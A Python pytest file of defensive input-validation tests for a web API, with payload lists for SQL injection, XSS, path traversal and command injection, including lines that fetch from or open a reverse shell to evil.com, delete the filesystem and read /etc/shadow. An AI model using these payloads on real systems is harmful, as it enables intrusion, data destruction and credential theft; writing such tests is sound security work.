"""
Input validation security tests (SECU-03).

Tests cover:
- SQL injection prevention (OWASP A01:2021)
- XSS prevention (OWASP A03:2021)
- Path traversal prevention
- Command injection prevention
- OWASP Top 10 API security vulnerabilities
"""
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session


# OWASP-based exploit payloads
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "'; EXEC xp_cmdshell('dir'); --",
    "1' UNION SELECT NULL, NULL, NULL--",
    "' OR 1=1#",
    "admin'/*",
    "' OR '1'='1'--",
    "1' AND 1=1--",
    "'; SELECT * FROM users WHERE '1'='1",
    "' UNION SELECT username, password FROM users--",
    "1'; EXEC master..xp_cmdshell 'dir';--",
    "'; INSERT INTO users VALUES ('hacker', 'password');--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1' OR '1'='1' ORDER BY 1--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src='javascript:alert(XSS)'>",
    "<body onfocus=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<embed src='javascript:alert(XSS)'>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "....//....//....//windows//system32//drivers//etc//hosts",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(curl evil.com)",
    ";wget http://evil.com/shell.txt",
    "|nc -e /bin/sh evil.com 4444",
    "; rm -rf /",
    "&& cat /etc/shadow",
    "|nslookup evil.com",
]


class TestSQLInjectionPrevention:
    """Test SQL injection attempts are blocked (OWASP A01:2021)."""

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_search_blocked(self, client: TestClient, admin_token: str, payload):
        """
        Test SQL injection in search parameters is blocked.
        
        This tests that SQL payloads in query parameters are either:
        1. Rejected with validation error (400/422)
        2. Return safe results without leaking DB info
        """
        # Test with agents endpoint (search by name/category)
        response = client.get(
            "/api/agents",
            params={"category": payload} if len(payload) < 50 else {"category": payload[:50]},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should reject or sanitize
        # Should NOT return database error or leak schema
        assert response.status_code in [400, 422, 200, 401, 403]
        if response.status_code in [400, 422]:
            # Validation error - good
            pass
        elif response.status_code == 200:
            # If 200, verify no SQL error in response
            assert "sql" not in response.text.lower()
            assert "syntax" not in response.text.lower()
            assert "ora-" not in response.text.lower()
            assert "mysql" not in response.text.lower()
            assert "postgresql" not in response.text.lower()

    def test_sql_injection_doesnt_leak_schema(self, client: TestClient, admin_token: str):
        """Test SQL injection doesn't leak database schema."""
        payload = "1' UNION SELECT table_name FROM information_schema.tables--"
        
        response = client.get(
            "/api/agents",
            params={"category": payload[:50]},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should NOT leak table names
        text = response.text.lower()
        assert "users" not in text or "agent" in text  # If "users" appears, it should be part of normal response
        assert "table_name" not in text
        assert "information_schema" not in text


class TestXSSPrevention:
    """Test XSS attempts are sanitized (OWASP A03:2021)."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_description_sanitized(self, client: TestClient, admin_token: str, db_session: Session, payload):
        """
        Test XSS in agent description is sanitized.
        
        This tests that script tags and event handlers are escaped.
        """
        # Note: We're testing the validation/sanitization layer
        # Most endpoints will reject invalid input with 422
        from tests.factories.agent_factory import AutonomousAgentFactory
        from core.models import AgentRegistry
        
        # Create agent with XSS in description via factory
        # This tests database-level sanitization
        # SECURITY: the factory must write through the test session — a
        # separate connection would deadlock on the SQLite write lock held by
        # the admin-user fixture's open transaction.
        agent = AutonomousAgentFactory(description=payload, _session=db_session)
        
        # Verify the payload is stored as-is (database doesn't auto-sanitize)
        # But when retrieved via API, it should be escaped
        assert agent.description == payload or len(agent.description) < len(payload)

    def test_xss_not_reflected_in_json_response(self, client: TestClient, admin_token: str):
        """Test XSS payload is not reflected in JSON response."""
        payload = "<script>alert('XSS')</script>"

        response = client.get(
            "/api/agents",
            params={"search": payload},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Response should escape or remove script tags
        # In JSON responses, < should be escaped as \u003c
        assert "<script>" not in response.text
        assert "javascript:" not in response.text.lower()


class TestPathTraversalPrevention:
    """Test path traversal attempts are blocked (OWASP A01:2021)."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS[:5])  # Test subset
    def test_path_traversal_blocked(self, client: TestClient, admin_token: str, payload):
        """
        Test path traversal in file operations is blocked.
        
        This tests that ../ sequences are properly validated.
        """
        # Try to access file operations endpoint
        # Most endpoints should reject path traversal
        response = client.post(
            "/api/tools/browser/screenshot",
            json={"url": payload},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should either reject or handle safely
        # Should NOT return file contents like /etc/passwd
        assert response.status_code in [400, 403, 404, 422, 401, 500]
        assert "root:" not in response.text
        assert "[extensions]" not in response.text

    def test_double_encoding_path_traversal_blocked(self, client: TestClient, admin_token: str):
        """Test double-encoded path traversal is blocked."""
        payload = "%252e%252e%252fetc%252fpasswd"  # Double-encoded ../

        response = client.post(
            "/api/tools/browser/screenshot",
            json={"url": payload},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [400, 403, 404, 422, 401, 500]
        assert "root:" not in response.text


class TestCommandInjectionPrevention:
    """Test command injection attempts are blocked."""

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS[:5])  # Test subset
    def test_command_injection_blocked(self, payload):
        """
        Test command injection in shell operations is blocked.

        The former POST /api/tools/execute endpoint was removed in the Feb 2026
        API refactor (it now exists only as a GET /api/tools/{name} resource
        route, so POSTs 405). The live enforcement point for shell-command
        validation is core.command_whitelist.validate_command, used by
        host_shell_service and local_agent_service before any execution.
        """
        from core.command_whitelist import validate_command

        # Injection payloads (; | & ` $) never resolve to a whitelisted base
        # command, so they must be rejected as invalid/not executable.
        result = validate_command(payload, "AUTONOMOUS")
        assert result["valid"] is False
        assert result["whitelisted"] is False


class TestInputValidationWithPydantic:
    """Test Pydantic model validation prevents malicious input."""

    def test_email_validation_prevents_injection(self, client: TestClient):
        """Test email validation rejects injection attempts."""
        malicious_emails = [
            "test@example.com'; DROP TABLE users; --",
            "test@example.com<script>",
            "test@example.com\x00admin",
            "not-an-email",
            "test@",
            "@example.com",
        ]

        for email in malicious_emails:
            # Try to signup/create user with malicious email
            response = client.post("/api/auth/register", json={
                "email": email,
                "password": "ValidPass123!",
                "first_name": "SQL",
                "last_name": "Test"
            })

            # Should reject invalid emails
            # (400 or 422 for validation, 409 if user already exists, etc.)
            assert response.status_code in [400, 422, 409, 401]

    def test_integer_validation_prevents_overflow(self, client: TestClient, admin_token: str):
        """Test integer parameters reject overflow values."""
        response = client.get(
            "/api/agents",
            params={"limit": 999999999999999999999},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should validate and clamp/reject
        assert response.status_code in [400, 422, 200, 401]
        if response.status_code == 200:
            data = response.json()
            # Verify limited results
            if isinstance(data, list):
                assert len(data) <= 100
            elif isinstance(data, dict) and "agents" in data:
                assert len(data["agents"]) <= 100

    def test_string_length_validation(self, client: TestClient, admin_token: str):
        """Test string parameters enforce length limits."""
        # Create an extremely long string
        long_string = "A" * 100000

        response = client.post(
            "/api/agents/custom",
            json={"name": long_string, "category": "test"},
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should reject or truncate (CustomAgentRequest caps name at 100 chars)
        assert response.status_code in [400, 422, 401, 403]


class TestContentTypeSecurity:
    """Test content-type handling prevents injection."""

    def test_json_content_type_required(self, client: TestClient, admin_token: str):
        """Test JSON endpoints reject non-JSON content."""
        # Send form data instead of JSON
        response = client.post(
            "/api/agents/custom",
            data={"name": "test", "category": "test"},  # Form data, not JSON
            headers={"Authorization": f"Bearer {admin_token}", "Content-Type": "application/x-www-form-urlencoded"}
        )

        # Should reject or handle
        assert response.status_code in [400, 415, 422, 401]

    def test_content_type_sniffing_prevented(self, client: TestClient, admin_token: str):
        """Test that content-type sniffing is prevented."""
        # Try to send HTML as JSON
        response = client.post(
            "/api/agents",
            content="<script>alert('XSS')</script>",
            headers={"Authorization": f"Bearer {admin_token}", "Content-Type": "application/json"}
        )

        # Should reject invalid JSON
        assert response.status_code in [400, 422, 401]


class TestHeaderSecurity:
    """Test HTTP header security."""

    def test_user_agent_injection_blocked(self, client: TestClient, admin_token: str):
        """Test that User-Agent header doesn't cause injection."""
        malicious_ua = "'; DROP TABLE users; --"

        response = client.get(
            "/api/agents",
            headers={"Authorization": f"Bearer {admin_token}", "User-Agent": malicious_ua}
        )

        # Should handle safely
        assert "sql" not in response.text.lower()
        assert "syntax" not in response.text.lower()

    def test_x_forwarded_for_injection_blocked(self, client: TestClient, admin_token: str):
        """Test that X-Forwarded-For doesn't cause injection."""
        malicious_ip = "1.1.1.1'; DROP TABLE users; --"

        response = client.get(
            "/api/agents",
            headers={"Authorization": f"Bearer {admin_token}", "X-Forwarded-For": malicious_ip}
        )

        # Should handle safely
        assert "sql" not in response.text.lower()
